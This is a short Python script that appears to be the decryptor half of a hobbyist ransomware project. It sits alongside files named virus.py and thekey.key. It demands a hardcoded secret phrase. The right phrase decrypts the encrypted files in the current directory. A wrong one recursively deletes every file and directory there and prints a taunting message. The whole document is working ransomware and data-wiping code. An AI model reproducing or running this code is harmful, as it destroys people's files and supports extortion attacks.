#!/usr/bin/env python3

import os
import shutil
from cryptography.fernet import Fernet

files = []
delfiles = []  # Renamed to avoid confusion with the string variable

# Collecting all files that are not the script or key files
for file in os.listdir():
    if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Collecting files and directories to delete
for file in os.listdir():
    if os.path.exists(file):
        delfiles.append(file)



with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "aarush"

user_phrase = input("Enter the secret phrase to decrypt your files (take care to put in the secret phrase correctly or you will lose all your files permanently):\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats, your files are decrypted. Enjoy your files!")

else:
    print("Sorry, secret phrase. Say bye to your files!!!")
    # Deleting all files and directories in the delfiles list
    for file in delfiles:
        try:
            if os.path.isdir(file):  # If it's a directory, delete it with shutil.rmtree()
                shutil.rmtree(file)
                print(f"Deleted directory {file}")
            elif os.path.isfile(file):  # If it's a file, delete it with os.remove()
                os.remove(file)
                print(f"Deleted file {file}")
        except Exception as e:
            print(f"Failed to delete {file}: {e}")
